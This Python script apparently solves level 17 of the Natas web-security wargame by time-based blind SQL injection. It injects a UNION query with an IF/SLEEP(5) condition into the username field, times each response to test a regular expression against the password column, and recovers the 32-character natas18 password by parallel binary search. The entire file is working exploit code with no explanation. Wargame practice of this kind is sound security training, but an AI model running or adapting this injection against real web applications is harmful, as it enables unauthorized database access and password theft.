import time
import string
from multiprocessing import Pool
from functools import partial
from natas import Natas


def get_exec_time(natas, payload: str):
    start = time.time()
    sql = 'natas18" union {} ; -- '.format(payload)

    post = {
            'username': sql
            }

    get = {
            'debug': 'true'
            }

    natas.get_response(post_data=post, get_data=get)
    interval = time.time() - start
    return interval


def get_normal_exec_time(natas):
    sql = 'select * from users where username="natas18"'
    return get_exec_time(natas, sql)


def is_char_in_range(natas, idx, rng):
    expr1 = 'CAST(password as BINARY) REGEXP "^\.{{{}}}[{}-{}]"'\
            .format(str(idx), rng[0], rng[-1])
    expr2 = 'SLEEP(5)'
    expr3 = '1=1'
    sql = 'SELECT * from users where username="natas18" and IF({},{},{})'\
          .format(expr1, expr2, expr3)
    exec_time = get_exec_time(natas, sql)
    if exec_time >= 5:
        return True
    return False


def get_alph_for_char_at_idx(natas, idx, rngs):
    for rng in rngs:
        if is_char_in_range(natas, idx, rng):
            return rng
    raise Exception('Add more characters,'
                    + 'because alphabet for char at index {} '.format(idx)
                    + 'could not be resolved')


def get_char_at_idx(natas, idx):
    ranges = (string.ascii_lowercase, string.ascii_uppercase,
              string.digits)
    alph = get_alph_for_char_at_idx(natas, idx, ranges)
    start = 0
    end = len(alph)
    while start < end - 1:
        temp = int((start + end) / 2)
        if is_char_in_range(natas, idx, alph[temp:end]):
            start = temp
        else:
            end = temp
    if is_char_in_range(natas, idx, alph[start:start + 1]):
        return alph[start]
    else:
        return alph[end]


def main():
    natas = Natas('natas17')
    func = partial(get_char_at_idx, natas)
    with Pool(32) as p:
        chars = p.map(func, range(32))
    password = ''.join(chars)
    print(password)


if __name__ == '__main__':
    main()
